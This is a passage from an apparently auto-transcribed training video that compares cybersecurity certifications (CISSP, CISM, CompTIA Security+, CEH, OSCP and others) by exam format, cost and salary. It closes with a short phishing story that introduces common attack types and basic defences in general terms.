this is an advanced level certification
so uh understanding of applications
networks and operating systems is a must
before you attend this the exam is quite
similar 150 questions in four hours
again it's just a multiple choice
question exam the cutoff again is from
60 to 85 percent depending on the
questions and the weightage of each and
every question job rules i.t security
specialist network security pro the job
roles forensic investigators law
enforcement agencies security
specialists homeland security jobs and
your salaries would be around 88 000 and
above all right now let's talk about the
managerial level certifications cobit
stands for control objectives for
information and related technologies
it's a certification that will give a
candidate an in-depth knowledge of the
framework for which cobit is all about
and the framework helps you manage and
govern enterprise id environments now
this is advanced certification so around
eight years of managerial experience is
suggested before you attempt the cobit 5
certification to understand all the
aspects and to help you implement the
framework properly the certification
certificate provider is asaka the exam
fee is around 175 dollars now this is a
small exam 50 questions but in 40
minutes so you really have to be on your
toes you have to know the knowledge
there is very limited time to think and
you have to be fast in your answers the
past percentage is 50 percent the job
rules associated with this certification
would be to when you apply for a
information security manager or as a
security consultant or a cyber security
manager and your roles and
responsibilities would be to govern an
uh it space that the organization owns
so all the servers desktops the network
the data flows the databases everything
and how it needs to be managed and how
it needs to be governed in a secure
manner annual salaries would be around a
hundred thousand dollars plus then the
cism also called as cism it stands for
certified information security manager
and as the name suggests it's a security
manager certification it helps the
candidate in understanding the
relationship between business goals and
information security so now you're going
into the space where you're not only
technical in nature but you also have to
understand the business needs the goals
of the business and you have to align
the information security of your
infrastructure along with the business
needs and the business goals so it is
your inputs that are going to go to the
management to see if the infrastructure
is aligned to the business goals or if
the infrastructure or the business goals
need any fine tuning around five years
of work experience is recommended in the
information security field for
attempting the cism out of the five
years the candidate must have a
background as an information security
manager for three years so you have some
experience as a manager uh you have
implemented those things yourselves
which will give you a better
understanding and then you attempt the
certification again providing by asaka
and the exam fees for asaka memphis is
575 dollars for non-members it is 760
the exam is where you have to answer 150
questions in four hours uh quite a bit
of time but questions are going to be uh
scenario based questions where they're
going to give you a lot of scenarios you
have to think about it and you have to
give the most probable and the correct
answer for that particular scenario the
past mark is 450 out of 800. your job
profiles would be either a risk manager
or a risk consultant analyzing the
business requirements to the
infrastructure security that that you
have and to identify if there any risks
associated with the infrastructure
highlight those risks and then put in
security controls and manage those
controls in a way where security is
mitigated your average salaries would be
around 88 000 and above then the cisa or
the cisa the certified information
systems auditor certification it not
only looks into security but it also
looks into auditing and controls in
information systems this is a highly
reputed certificate and you gain a
better understanding of governance
regulations and auditing your
information landscape again a minimum of
five years of work work experience in
the field of information systems
auditing control or security is
necessary now here the question would be
what's the difference security is where
you're technical in nature you have done
let's say vulnerability assessment or a
penetration test you have implemented
firewalls you have architected security
controls are all about the security
controls that you're going to implement
like firewalls idss ips's data loss
prevention systems uh maybe even
utms and whatnot so experience in
architecting or implementing those
controls in an effective manner
mitigating your security or your your
vulnerabilities that you have identified
in the organization and auditing would
basically mean about looking at
compliance to ensure that
everything is in place you're compliant
with let's say uh iso 27001 guidelines
or the policies that you have created
yourself and everything is working in
order so it's more of a checklist where
you're going to just check everything is
in place and you're conforming to
standards this certification is also
provided by saka and the exam fees for
isaka members are 575 dollars whereas
nisaka members will have to pay 760
dollars for the certification 150
questions again in four hours multiple
choice questions scenario based so you
have to really understand the real world
scenarios of where what controls and
what audit mechanism should be in place
past mark is 450 out of 800. your job
roles would be mainly becoming an
auditor or a senior auditor a director
for information security information
audit manager or information technology
consultant where you provide
intelligence on how the company should
implement their infrastructure average
salaries would be one hundred and three
thousand and above then comes the crisc
also called as chris certified in risk
and information systems control
certification helps the candidate design
and maintain information systems
controls for an organization this is one
of the most sought after certifications
as far as risk management is concerned
in europe and in u.s if you have this
kind of certifications you automatically
qualify for a risk manager or a security
risk manager or a information security
consultant kind of role you should have
a minimum of three years of experience
in the field of is controls that means
information security controls you should
have knowledge about firewalls you
should know about how to mitigate risks
how to identify risks in the first place
risk analysis risk management and after
which you're going to implement security
controls to mitigate that risk or bring
it to acceptable levels at this point in
time you will also be responsible to
create policies revolving those risks
and how you want to calculate those
risks and treat those risks in their
lifetime certificate provider again is
the saka 575 dollars for isa members 760
dollars for non asaka members for the
exam fees a similar question 150
questions to be answered in four hours
multiple choice based on performances so
they may give you a scenario where you
have to perform a risk analysis and
provide a report and a solution based on
your findings again the past mark is 450
out of 800. the job profiles associated
as discussed earlier are the it risk
management professionals where they're
going to identify risks treat those
risks calculate analyze maybe do a
business impact analysis to ascertain
how the organization is going to be
affected and then you will also be
looking at compliances as far as these
job roles are concerned average annual
salary would be 119 000 and above moving
on to advanced level certification now
this is where we come across the cissp
or the cis certification certified
information system security professional
this is the gold standard of all
certifications if you have this
certificate it's you can basically be
assured of a job in the id world now
just to qualify you'll have to have five
years of experience in the information
security field there are eight domains
that are specified by cissp
and you have to prove that you have
knowledge and your work experience of
around five years in at least two of
those two means if you do not have those
kind of experiences you can still
attempt the exam but you become an
associate of iic square which means that
you get six years to accomplish the five
years of
experience requirement for this
certification before taking up the cis
certification it suggested that the
candidate clears all the intermediate
level certifications not all but some of
them in fact i've seen people do the
other way around they qualify for cissp
they give the exam once your cissp the
csa or see some cis or cism exams are
way easier to crack but you need to have
that kind of experience i have seen
people with 15 years of experience and
more
fail at this certification in the first
attempt the certificate provided is ic
square the exam fees is 699
like i said this certification is most
sought after the gold standard in fact
there's hardly any other certifications
after this that you might want to do the
questions now the exam has changed if it
is the english version that you're
giving it's 150 questions to be answered
in three hours if it is the non-english
exam that you're attempting then it is
250 questions in six hours it's a
marathon and if you're opting for the
six hour exam you need to plan it really
well it sounds really easy but the
questions are quite tough they're
scenario based and the answers are quite
confusing as well you would get multiple
choice questions you would get drag and
drop and you might get simulators as
well uh the pass mark is 700 out of 1000
but each question has a different
weightage so
it depends on which questions are asked
of you and which questions you have
answered correctly the job rules
associated with this certification would
be anything and everything in
information security at the managerial
level and above so information security
manager risk manager system uh
information system security officer the
cso role the ciso chief information
security officer any role that you might
think of as a risk from a risk
compliance strategy could be achievable
after this kind of a certification the
average annual salary is hundred and
eight thousand dollars for this
certification first let me briefly
introduce comptia before moving on to
the comptia security plus certification
the computing technology industry
association or better known as comptia
is a leading vendor-neutral i.t
certification provider in the world
comptia is considered one of the top
trade associations
its vendor neutral certification program
is undoubtedly one of the best in the it
industry
for more than two decades comptia has
developed certification exams and
training for networking security open
source development and cloud to name a
few
comptia certifications continue to
address the requirements and necessities
of today's technology challenges
comptia certifications are grouped by
skill set presently comptia
certifications are classified into four
areas core infrastructure cyber security
and additional professional
certifications
if you have a job that may involve some
sort of certification you must consider
obtaining that certification
certifications are very crucial comptia
certifications are a way for it
professionals to demonstrate their
knowledge of computers
let us now have a look at a few of the
certifications offered by comptia
first we have comptia a plus
comptia a plus certification is an entry
level certification for it technicians
this certification is designed for
employees who are seeking a career as a
support service center or networking
technician
this certification tests a candidate's
understanding of basic networking
troubleshooting and security skills
it covers laptop and pc hardware
software installation and configuration
of operating systems
according to comptia more than one
million it professionals hold the a plus
certification
next we have comptia network plus
you can either start with the a plus
certification however if you have the
experience you can move directly to the
comptia network plus certification
this certification is for professionals
who carry a minimum of nine months of
networking experience
here a candidate must be familiar with
networking technologies topology
security installation and configuration
and troubleshooting of wireless and
wired network devices
next we have comptia security plus
comptia security plus covers network
security concepts threats and
vulnerabilities access control identity
management cryptography and much more
we will closely look at the comptia
security plus certification in this
video and finally this comptia cloud
plus the comptia cloud plus
certification finds its importance as
the cloud computing market continues to
grow by leaps and bounds
this certification targets it
professionals with two to three years of
experience in storage networking or data
center administration
the certification exam tests the
candidates knowledge of cloud
technologies cloud markets and hybrid
and multi-cloud solutions
those were a few of the certifications
offered by comptia there are several
other certifications like comtia linux
plus comptia pentest plus and comptia
project plus to name a few now let us
have a look at the comtia security plus
certification in detail
so what is the comptia security plus
certification
well the comptia security plus
certification is a leading entry level
it certification it is an essential
certification for professionals working
in the it industry
it is one of the first security
certifications that must be earned by it
professionals
it provides the core knowledge required
of any cyber security role and provides
a spring boot to various intermediate
level cyber security jobs
this certification teaches you how to
secure applications devices and networks
it also focuses on hands-on practical
skills in the field of network security
this certification teaches you skills
from spotting and mitigating risks to
troubleshooting security incidents
it is to be noted that id professionals
with comptia security plus know how to
address security incidents and not just
identify them
so now that you know what comptia
security plus certification is about let
us look at a few points as to why a
professional must choose this
certification
the first reason being it's a vendor
neutral certification
the comptia security plus certification
is vendor neutral which implies that you
don't have to center on technology and
security of a precise vendor the skills
and knowledge achieved through this
certification make security
professionals and network administrators
become in demand in the it marketplace
the comptia security plus certification
is globally acknowledged to be one of
the fundamental security certifications
in the field of cyber security
comcast security plus certification is
universally recognized and trusted
across the world
security plus provides hands-on skills
one of the few entry-level cyber
security certifications that emphasizes
on hands-on practical skills
this ensures a security professional is
better prepared to solve several complex
issues of the current times
the comptia security plus certification
is aligned with the latest techniques
and trends it covers core technical
skills in risk assessment and management
incident response forensics and cloud
operations to name a few
thereby ensuring high performance on the
job
having this security certification
provides you a wider breadth of career
opportunities the comptia security plus
exam is performance based which makes
the knowledge and skills learned more
applicable
there are numerous job roles that turn
to security plus to supplement baseline
cyber security skills
cyber security professionals are in
demand by organizations from both
private and public areas
with this certification you can take up
jobs related to compliance and
operational security threats and
vulnerabilities access control and
identity management and cryptography to
name a few
it is to be also noted that
professionals with the security plus
certification have greater opportunities
of receiving higher salaries than
non-certified professionals
another benefit of this certification is
that if you wish to get a cyber security
government job obtaining the comptia
security plus certification will be an
ideal starting point for you
so now that you know the perks of
achieving this certification what do you
have to do to achieve this well before
you can achieve this certification you
have to clear the comptia security plus
exam
let us now have an overview of the
comptia security plus exam
first and foremost who can take up this
exam although comptia does not have any
set prerequisites organizations
recommend that candidates meet these two
criterias let's have a look at the two
criterias
firstly the comptia security plus is for
it professionals who carry a minimum of
two years of experience in the it
administration focusing on security
the comptia security plus is ideal for
professionals who are looking to start
or advance a career in security
obtaining this certification prepares
the professionals for job roles like
system administrator security
administrator network administrator
junior penetration tester security
engineer and security consultant to name
a few
though comptia security plus is an
entry-level certification it is strongly
recommended that you get the a plus and
network plus credentials before
proceeding to the security plus
certification
this will ensure that you have the
required technical skills like
configuring managing and troubleshooting
networks
now let's move on and understand the
comptia security plus exam details
comptia security plus
sy-0601 is the latest exam code that was
launched on 12 november 2020.
the
sy00501 english language exam retires on
31st july 2021 hence we recommend you to
opt for the
sy-0601 exam
there are a maximum of 90 questions
comptia security plus exam has multiple
choice questions but some comptia
certification exams include
performance-based questions or pbqs
performance-based questions test a
candidate's ability to solve problems in
a simulated environment
the passing score for this certification
exam is 750 on a scale of 100 to 900.
the duration of the exam is 90 minutes
so time management is crucial to clear
the exam since you need to solve each
question within a minute
comptia security plus
sy-0601 exam is currently available in
english and japanese language
you can enroll for the exam by booking a
slot online or registering with pearson
view testing centers
the price of the comptia security plus
certification exam is 370 us dollars in
australia the price is 500 australian
dollars and in european currency it is
334 euros
let us now look at the focus areas of
comptia security plus exam
firstly this exam focuses on the core
cyber security skills required of any
cyber security role such as security
incident handling and response intrusion
detection malware prevention etc
the second area of focus is threats
attacks and vulnerabilities this
includes analyzing indicators of
compromise and determining types of
malware or comparing and contrasting
types of attacks
next up we have identity and access
management
this topic emphasizes on implementing
identity and access management controls
or differentiating common account
management practices
the fourth domain that comptia security
plus focuses on is risk management this
domain describes the importance of
policies plans and procedures related to
organizational security
finally we have cryptography and pki
here the exam deals with questions
related to comparing and contrasting
basic concepts of cryptography and
implementing public key infrastructure
another key focus area of this exam is
how to troubleshoot common security
issues and deploy mobile devices
securely
now coming to the final section of this
video where we look at the important
skills that you will acquire after
completing the comptia security plus
certification exam
first you will learn to detect various
types of compromise and understand
penetration testing and vulnerability
scanning concepts
this certification will give knowledge
to assess the security posture of an
enterprise network and recommend and
implement appropriate security solutions
you will also get an idea of installing
configuring and deploying network
components while accessing and
troubleshooting issues to support
organizational security you will gain
the desired skills to monitor and secure
hybrid environments including cloud
mobile and iot
comptia security plus certification
exams give the experience to install and
configure identity and access services
you will understand how to identify
analyze and respond to security events
and incidents
finally you will grab another crucial
skill that is to implement best
practices on risk management
comptia security plus certification will
make you understand how to implement and
summarize risk management best practices
and the business impact
it ensures you operate with an awareness
of applicable laws and policies
including the principles of governance
risk and compliance
that was all about the comptia security
plus exam taking up this exam will help
you learn a lot about cyber security and
acquire the necessary skills that will
help you become a greater cyber security
professional
this is why organizations look for
professionals with comptia certification
this certification is evidence of your
expertise in the security field
comptia security plus certification is
prevalent among security professionals
although the exam requires a lot of hard
work to crack the reward is very
fruitful all the best to everyone who
wishes to be comptia security plus
certified let us understand the
importance of the ca certification
before getting to know about its content
so why should you take up the ch version
11. the certified ethical hacker is the
most trusted ethical hacking
certification and a recommended one by
employers around the globe
since the introduction of the ca
certification in 2003 it is globally
recognized as a standard within the
information security field the ch
version 11 by ec council continues to
keep up to the standard and it
familiarizes the latest hacking
techniques and teaches you advanced
hacking tools and exploits used the ch
version 11 aligns with the current cyber
security market requirements and adds
the latest advancements in the cyber
security field
the c8 certification helps and trains
you to think like a hacker and this in
turn helps you beat a hacker and defend
your network after obtaining the ca
certification you'll be a certified
ethical hacker a certified ethical
hacker is a skilled professional working
in a red team environment who safeguards
networks and understands attack
strategies and mimics the skills of
malicious hackers certified ethical
hackers discover vulnerabilities in a
system and operate with permission from
the system owners only
so who can become a certified ethical
hacker and who can take up the ca
certification let us have a look at that
now
in the first case to be eligible for the
ca certification exam you need to attend
the official training from authorized ec
council training partners it can be an
online training or tutor-led training
from easy council learning partners only
then are you eligible to take up the ca
certification exam
so a candidate who has completed an
official ec council training is eligible
to take up the exam without going
through the application process
or in the second case in order to be
considered for this credential you need
to have at least two years of work
experience in the information security
domain and you must pay a non-refundable
application fee and submit an
eligibility application form
once it is approved you can take up the
ch exam
after the application is approved you
can purchase the test voucher
in the latest version of the ceh we will
see the addition of various core
concepts moving on to our next topic let
us see how different the ch version 11
is and few of its objectives
firstly it outlines ethical hacking
concepts cyber kill chain concepts and
overview of information security and
various laws and regulations related to
information security this certification
briefs you about the faces of system
hacking attacking techniques and how you
can maintain access
it also briefs you about footprinting
concepts and ways of utilizing
footprinting tools along with necessary
countermeasures
the next objective is to familiarize
with vulnerability assessment along with
the hands-on experience of various
scanning tools
next we have cybersecurity threats like
malware threats analysis of various
worms viruses and trojans
various malware concepts packets
sniffing concepts and techniques have
been introduced into this domain
it also highlights the concepts related
to social engineering denial of service
attacks sql injection and aviation
techniques
it also speaks about wireless hacking
concepts and mobile device management
the concept of operational technology is
a new addition this time
next is getting acquainted with security
solutions like firewalls honeypots ips
their evasion and protection
our fifth point is knowing various
topics in cryptography like encryption
algorithms public key infrastructure and
cryptanalysis
moving on the next objective is to
incorporate padded security os as it
offers better performance on lower
powered laptops and machines when
compared to kali linux
next is to learn to recognize and deal
with iot based vulnerabilities and
attacks with the ch version 11 course
that covers the latest iot hacking tools
you would be required to ensure the
safety of iot devices
our next point is with respect to the
evolving cloud industry you would need
to learn how to identify and defend
cloud-based threats and attacks
the latest version of ch includes new
operating systems and windows 10
configured with domain controller and
vulnerable web applications for
improving hacking skills
finally what is different is that more
than 50 percent of the ch version 11
course is dedicated to practical skills
in live ranges by our ec council labs ec
council leads in this aspect of the
industry now that we saw the ch exam
objectives let us look into the ch exam
topics weightage
as you see on your screens this is a pie
chart with 9 domains in ch along with
their weightages
you can prepare for your exam
accordingly
let us move on and take a closer look at
each of these domains their respective
subdomains and their descriptions
our first domain is information security
and ethical hacking overview
this domain consists of questions from
information security cyber kill chain
concepts ethical hacking concepts
various hacking concepts and information
security laws and standards
you can expect a total number of eight
questions from this domain the weightage
of this section is six percent
the second domain is reconnaissance
techniques under the subdomains we have
footprinting and reconnaissance at first
this covers various topics like
footprinting concepts footprinting
methodology email footprinting
footprinting through web services dns
footprinting footprinting through social
engineering etc
the next subdomain in this section is
scanning networks
scanning networks covers various
concepts like scanning tools host
discovery port and service discovery os
discovery draw network diagrams scanning
beyond ids firewall etc
and our third subdomain under
reconnaissance techniques is enumeration
various topics like snmp enumeration ntp
and nfs enumeration smtp and dns
enumeration and enumeration counter
measures are covered under this
subdomain a total of 26 questions will
be asked from this domain under
footprinting and reconnaissance you will
have 10 questions and under scanning
networks and other 10 and finally under
enumeration you will have six questions
a total weightage of 21 percent is given
to this particular topic
our third domain is system hacking faces
and attack techniques
under our third domain our first sub
domain is about vulnerability analysis
this subdomain covers topics on
vulnerability assessment vulnerability
classification vulnerability assessment
solutions and tools and various
vulnerability assessment reports our
next sub domain is about system hacking
you have concepts like gaining access
cracking passwords vulnerability
exploitation escalating privileges
maintaining access covered under this
subdomain and finally we have malware
threads under this domain malware
threads incorporate concepts like apt
concepts trojan concepts virus and worm
concepts malware analysis and so on a
total of 21 questions will be asked from
this domain
under vulnerability analysis there will
be nine questions asked system hacking
and other six questions and finally
under malware threats you will have six
other questions asked
that sums up to a total 21 with a
weightage of 17 for this domain
our fourth domain is about network and
perimeter hacking
here you have various sub domains and
one of it is social engineering under
social engineering you will be asked
questions based on social engineering
techniques insider threats impersonation
on social networking sites identity
theft and so on you'll also have various
question on the sniffing concepts as it
is another sub domain
you can also expect questions from the
denial of service subdomain here
questions related to botnets and ddos
attacks will be asked various session
hijacking concepts are another crucial
part of this domain
the final subdomain is about evading ids
firewalls and honeypots
here various concepts on ids ips
firewall and honeypots are covered you
will need to understand how to evade ids
and firewalls and how to detect
honeypots
a total number of 18 questions will be
asked from the fourth domain that was
network and perimeter hacking and the
weightage for this domain is 14
our fifth domain is about web
application hacking and our first sub
domain in it is hacking web servers
this incorporates concepts related to
web server attacks web server attack
tools patch management and so on
the next sub-domain is about hacking web
applications here you have various
concepts related to bypass client-side
controls analyze web applications
footprint web infrastructure attack
access controls and how to perform
injection attacks and so on
finally under the sql injection
sub-domain you will have questions based
on sql injection the types of sql
injection the sql injection methodology
sql injection tools aviation techniques
and sql injection counter measures
here a total of 20 questions will be
asked from this domain
and that is a weightage of 16 will be
given to the web application hacking
domain
our six domain is solely devoted to
wireless network hacking
this domain focuses on hacking wireless
networks various wireless concepts
wireless encryption wireless threats
wireless hacking tools various hacking
methodologies bluetooth hacking and
wireless counter measures are covered a
total of eight questions will be asked
from this domain with a weightage of six
percent
our seventh domain is all about mobile
platform iot and ot hacking our first
sub domain here is hacking mobile
platforms
here the concepts that are touched upon
our mobile platform attack vectors
hacking android os hacking ios mobile
device management and mobile security
guidelines and tools
our next sub domain here is about iot
and ot hacking which covers concepts on
iot hacking tools its methodologies
counter measures and it also speaks
about ot concepts ot attacks ot hacking
tools and ot counter measures
you have a total of 10 questions asked
from this domain with a weightage of 8
percent
the next domain is very interesting and
it is all related to cloud the cloud
computing domain covers concepts based
on cloud computing serverless computing
cloud computing threats cloud hacking
and cloud security the weightage given
to this domain is six percent with the
total number of questions of seven and
finally we have cryptography as our
ninth domain
as the name suggests this domain covers
topics based on cryptography concepts
encryption algorithms cryptography tools
public key infrastructure email
encryption disk encryption crypt
analysis and counter measures
and seven questions will be asked from
this domain with a weightage of six
percent now that you saw the ch exam
topic's weightage let us have a closer
look at the ch exam details
let us first have a look at the ch exam
based on mcqs
the exam title is certified ethical
hacker with the exam code of 312-50
this exam will have 125 questions with a
time limit of 4 hours the test format is
multiple choice questions the pass
percentage varies ideally between 60 to
85 percent now let's have a look at the
ch practical exam details in order to
gain the ch master recognition it is
mandatory that you take up the ch
practical exam as well
the exam title is certified ethical
hacker practical and this practical exam
will have 20 questions with a duration
of 6 hours
the exam format will be ilab cyber range
and finally the passing score for the ch
practical exam is at 70 percent after
clearing both the mcq based exam and the
practical exam you can get the ch master
recognition now that we had a look at
the ch exam details let us have a look
at the career prospects for a
professional with this certification
having the ch certification guarantees
that you have an insight into the
hacking world hence companies want to
hire professionals who can think like a
hacker and safeguard their networks and
systems
a candidate with the ca certification
can apply for various cybersecurity job
roles such as penetration tester
security engineer and information
security analyst from the long list
according to pay scale the annual
average salary of a ch professional in
india is rupees 5 lakhs per annum
meanwhile in the united states a
professional holding the ca
certification earns nearly 93 000 on an
average basis annually now that you had
a look at the ch version 11
certification and its career prospects
what are you waiting for get certified
with simply learn and back that ca
certification so let's start looking at
the certifications so to be an ethical
hacker you must hold a certification
which specializes in ethical hacking or
in cyber security companies look for
candidates who are globally certified
when we say globally certified they're
looking for a certificate that has been
given by an organization that is
recognized globally and is well accepted
in the industry so these are the top
five certifications a candidate can
obtain the first one become a certified
ethical hacker then there is global
information assurance certification
penetration tester then offensive
security certified professional comptria
pentest plus and finally the license
penetration tester now these
certifications are offered by different
organizations all of these organizations
are recognized globally and their
certifications are well accepted in the
technical space so let's start off with
the certified ethical hacker and we'll
look at the organizations that provide
these certifications and how we can
attain them so ceh or certified ethical
hacker in its current form is in its
version 10 it's been revised and updated
over a period of time ec council is the
certifying authority for ceh they have
their own authorized training centers
through which you can attend trainings
give those exams get yourself certified
and thus become globally certified and
can be eligible to apply for security
related jobs it is a very well known
certification and is widely accepted at
the same time it would test the
candidate's knowledge of security
threats and preventive measures now
there are two types of exams that you
can give with ceh one is a multiple
choice question exam which is
theoretical in nature they ask you
questions and you answer the correct one
you'd select the correct answers if you
clear you get certified the second
certification nowadays is where there's
a practical exam associated with it
that's a you'll have to purchase the
voucher for that exam and give that exam
the practical exam is held in a virtual
lab where they you're given scenarios
and based on those scenarios you have to
resolve the questions given to you and
give proof of the resolution which would
then
get you certified as an ethical hacker
the theoretical exam in this scenario is
the fees is around 500 dollars this is
for the multiple choice question exam
where you can pay the fees and you can
attend through a
online portal and you can give the exam
directly the exam is four hours long in
which you have to answer 125 questions
now four hours for 125 questions seems a
long time but it isn't it's a very
technical exam there are scenario based
and it would take some time for you to
analyze and understand the question and
then identify the equivalent correct
answer so it's a very competitive exam
and you'll have to study really hard to
clear this exam as well the cutoff for
passing varies from 60 to 85 percent so
there is no exact grade and all the
questions have different weightages so
depending on the questions that have
been given to you and the way that you
have answered them you would pass at
either 60
or you would pass when you scored 85
percent once you are ceh certified which
is a very technical certification you
will be qualified to apply for job roles
as a penetration tester or a security
engineer these are job roles where you
would be responsible of ethically trying
to attack applications
servers switches and try to find out
vulnerabilities within them the training
of this certification will make you
adept in most of these tools that are
required there are a lot of practicals
in this training and if you successfully
completed those practicals clearing the
exam is a easy task with the practicals
comes your knowledge and would help you
understand how you would be performing
penetration tests in the real world an
average annual salary in the usa for a
cea certified person is around 91 000
dollars and in india is around four like
76 000 odd rupees the salaries would
vary as far as organizations are
concerned more established organizations
can afford to pay a little bit more but
these are average salaries that we have
seen across the market the next
certification is the gpen also known as
the global information assurance
certification penetration tester this
certification looks into the different
pen testing practices and methods also
focuses on the various problems and pen
testing so again this is where you
getting certified as a penetration
tester so it's again a technical
certification where your knowledge on
networking applications and security of
which will be tested uh you will be
trained on this of course so the
training will include all these areas
where you need to focus identify those
problems and thus be ready for the real
world scenarios the candidate will have
to understand networking concepts and
operating systems such as linux and
windows and you should be very well
aware of the tcp protocols this is true
for any of the technical certifications
for ethical hacking giac is the
certification provider it's again a very
well renowned and well accepted
certification authority across the globe
the exam fees are 1899
82 to 115 questions to be answered in
three hours now why 82 215 it depends on
the test that has been associated and
depending on how you're answering those
questions uh you would be given those
many number of questions to begin with
but all of these need to be answered in
three hours 74 percent is the past
percentage that is required to clear
this exam the average annual salary in
the usa is around 96 000
while in india it is around similar to
certified ethical hacking then looking
at the next certification from offensive
security called the oscp
offensive security certified
professional this is another penetration
testing certification highly technical
in nature and it is an entirely hands-on
certification the previous two
certifications that we saw we talked
about ceh where there are two different
exams you could either take the
theoretical exam and give your mcqs or
you could take the practical one here
you don't have an option this is a
practical exam so the test is conducted
on a virtual network so they send out
instructions to you there's a virtual
lab that is given out to you and they
give you the questions and you have to
perform those assessments create those
reports and provide it to the certifying
authority in this case offensive
security uh if you match their criterias
of whatever you have identified in those
reports you get certified here the
requirements of good understanding of
networking protocols how systems
function how kali linux operating system
functions and the candidate must for
complete offensive securities
penetration testing with the kali linux
course and pass the hands-on exam so
this focuses purely on kali linux kali
linux is an operating system that is
freely distributed over the internet and
comes structured with around 300 plus
tools used for ethical hacking so this
course totally relies on kali linux for
you to use as a tool set for penetration
testing the certificate provider as
stated is offensive security the name of
the course is oscp offensive security
certified professional exam is around
800 to
1550. now understand that this exam is
technical and is hands-on so for you to
prepare for this exam they come up with
virtual labs where you can start
practicing and honing your skills
depending on the number of days for
which you have purchased the access to
that particular labs the amount will
vary from eight hundred dollars which
would be the minimum access days
available to one thousand five hundred
and fifty dollars where the maximum
number of days would be given to you for
practicing once you're ready even during
the times per time span of where you
have that access once you're ready for
the exam you can you can attempt the
exam and clear the average annual salary
is similar around 91 000 for the us
market and 905 000 rupees in the indian
market then looking at the komcha
pentest plus comptia is another
certification authority or a
certification provider a training
provider that that will help you get
yourself certified in the ethical
hacking space so they have certification
called pen test plus which is focused
towards penetration testing so it is an
intermediate level certification it
assesses the vulnerability assessment
and the penetration testing skills of a
candidate here the training will provide
you with all the essentials where it
will help you identify how to do
vulnerability assessments how to
identify those vulnerabilities and then
which tools to utilize for what kind of
a penetration test for the requirements
a minimum of three to four years of
hands-on experience in the information
security field also a comchia security
plus or a network plus or equivalent
knowledge is required so in the network
plus they talk about securing networks
and they help you understand the osi
layers the tcp layers and help you
understand the protocols and all of
those things so having that knowledge is
an added advantage the certificate
provider is comptia and the cost of the
exam is around 349
maximum number of questions
is 85 and i think it's a three hour exam
the passing percentage is uh scoring 750
marks out of a possible 900. so the
scale is the minimum you can have a
score is 100 if you're completely
unprepared the maximum you can score is
900. uh you get a leeway of 150 marks
for your certifications so you have to
score a minimum of 750 to clear the exam
average annual salary for your homechia
certified penetration test plus
professional is 97 000 in the u.s market
and in the indian market it would be
around 5 lakh rupees then comes the
license penetration tester now this is
an advanced certificate again from ec
council this is where ac council gives
you a license which certifies that you
have undergone thorough training and
have cleared your exam in which you can
conduct or lead a audit for
vulnerability assessment and penetration
testing it is an expert level
certification comes after the ceh
certification it is the ultimate test
which tests this candidate's penetration
testing skills so there are two
certifications over here one is the ecsa
ec council certified security analyst
once you clear that you get you can
appear for the license penetration
tester both of these are hands-on
certifications so you will be given a
virtual lab you will be given a scenario
in which you'll have to perform some
assessments create reports submit it to
the ec council they will analyze your
reports if they meet the criterias that
have been identified you would then be
certified as a licensed penetration
tester the candidate must be above 18
years of age a recertification is
required every three years so the
validity is three years after three
years you will have to be recertified or
there is a continuing point education
system over there where you can score
points by publishing articles by
attending trainings or giving out
trainings and carrying ideas are free
certified it is preferred that the
candidate has ceh and the ecsa
certification so the previous
certification that we saw certified
ethical hacker and then the ecsa ec
council certified security analyst after
which you can appear for the lpt license
penetration tester the certificate
provider again is ec council the license
penetration tester exam has a different
process the candidate must purchase an
exam dashboard for 899 which is valid
for a year so once you purchase the
voucher the validity is one year you can
prepare within that one year and then
give the exam and attain the
certification only once you are ready
the exam can be scheduled and you can
give that exam the exam consists of
three different levels each level has
three different challenges the candidate
must pass at least one challenge in
order to qualify for the next level and
for each level the exam is six hours so
this is a grueling exam this is hands-on
they're giving you challenges and they
are going to test you on your skills as
a penetration tester so be ready to be
very hands-on for this kind of a
certification average annual salary in
the u.s is around hundred thousand
dollars and above and in india 825 000
and above meet anne
she often shops from
www.shoppingcart.com
she has her information like email id
address and credit card details saved on
the website to enable a faster and
hassle-free shopping experience the
required information is stored in a
server
one day anne received an email which
stated her eligibility for a special
discount voucher from shoppingcart.com
in order to receive the coupon code she
was asked to fill in her
shoppingcart.com account credentials
this didn't seem fishy to her at the
time as she thought it was just an
account verification step
little did she realize the danger she
would be facing
she was knocked off her feet when a
substantial amount of money was wiped
off her account
how do you think this happened
well yes the email she received was fake
anne's shoppingcart.com account
witnessed unauthorized access from a
third party this type of attack is known
as a cyber attack and the person who
carries it out is called a hacker
could anna prevented this attack
indeed she could have
with the help of cyber security
cyber security involves techniques that
help in securing various digital
components networks data and computer
systems from unauthorized digital access
there are multiple ways to implement
cyber security depending on the kind of
network you are connected to and the
type of cyber attacks you are prone to
so let's take a look at the various
cyber attacks that anne could have been
exposed to
one of the most common types of cyber
attacks is a malware attack like trojan
adware and spyware to name a few
had ann downloaded any suspicious
attachments online her system could have
gotten corrupted by certain malicious
viruses embedded within the attachments
next is a phishing attack the type of
cyber attack which ann experienced
here the hacker usually sends fraudulent
emails which appear to be coming from a
legitimate source
this is done to install malware or to
steal sensitive data like credit card
information and login credentials
another type of attack is the man in the
middle attack
here the hacker gains access to the
information path between ann's device
and the website's server the hacker's
computer takes over anne's ip address by
doing so the communication line between
ann and the website is secretly
intercepted
this commonly happens with unsecured
wi-fi networks and also through malware
password attack is one of the easiest
ways to hack a system
here and's password could have been
cracked by using either common passwords
or trying all possible alphabetical
combinations
to prevent future cyber attacks and
sought to implement a few cyber security
practices
first she installed a firewall as the
name suggests it is a virtual wall
between anne's computer and the internet
firewalls filter the incoming and
outgoing traffic from your device to
safeguard your network and they can
either be software applications or
hardware reinforcements
secondly and implemented honeypots just
like how flowers attract bees dummy
computer systems called honeypots are
used to attract attackers
these systems are made to look
vulnerable in order to deceive attackers
and this in turn defends the real system
in addition to these she also decided to
use unique alphanumeric passwords
antivirus software and started avoiding
mails from unknown cinders
that was ann's story
cyber attacks are not just confined to
individuals but also to public and
private organizations
the cyber attacks carried out in such
places are more deadly and they result
in colossal losses
motives of such attacks are many
starting from tampering with crucial
data to monetary gains
let's have a look at a few of the cyber
attacks that companies are subjected to
various public sector organizations and
large corporations face the advanced
persistent threat apt
in this form of attack hackers gain
access to networks for a prolonged
period in order to continuously gain
confidential information
companies also witness the denial of
service attack where networks are
flooded with traffic which in turn
leaves legitimate service requests
unattended a variant of this is the
distributed denial of service ddos
attack when multiple systems are used to
launch the attack
when a hacker manipulates a standard sql
query in a database driven website it is
known as a sql injection attack
by doing so hackers can view edit and
delete tables from databases
amidst a plethora of cyber attacks it is
indeed a challenge for organizations
with several networks and servers to
